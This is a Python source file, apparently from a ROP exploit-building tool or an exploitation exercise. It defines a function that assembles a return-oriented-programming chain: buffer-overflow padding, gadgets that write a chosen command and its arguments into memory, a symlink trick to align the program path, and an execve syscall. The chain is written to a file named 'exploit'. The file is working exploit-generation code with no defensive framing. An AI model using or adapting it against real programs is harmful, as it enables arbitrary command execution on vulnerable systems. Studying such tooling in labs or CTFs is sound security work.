from pathlib import Path
import os

import Extracted_Functions


def generate_execve_chain(padding, data_address, command, envp):

    data_stack_pointer = data_address

    rop_chain = b'A' * padding

    argv = command.split()

    if (len(argv[0]) % 4) is not 0:
        symlink_path = Path("Evil")
        if os.path.exists(symlink_path):
            os.unlink(symlink_path)
        os.symlink(argv[0], symlink_path)
        argv[0] = "Evil"
    for arg in argv:
        # Split string into chunks of size 4.
        chunks = [arg[i:i + 4] for i in range(0, len(arg), 4)]
        chunks = [chunk.encode('ascii') for chunk in chunks]
        # If the chunk isn't big enough, pad it with null characters.
        chunks = [chunk.ljust(4, b'\0') for chunk in chunks]

        for chunk in chunks:
            rop_chain += Extracted_Functions.push_bytes(chunk, data_stack_pointer)
            data_stack_pointer += 4

        rop_chain += Extracted_Functions.push_null(data_stack_pointer)
        data_stack_pointer += 4

    rop_chain += Extracted_Functions.push_null(data_address + 8)
    rop_chain += Extracted_Functions.execve_syscall(data_address + 8, data_address + 8)

    exploit_path = Path("exploit")
    with open(exploit_path, 'wb') as file:
        file.write(rop_chain)

    return exploit_path
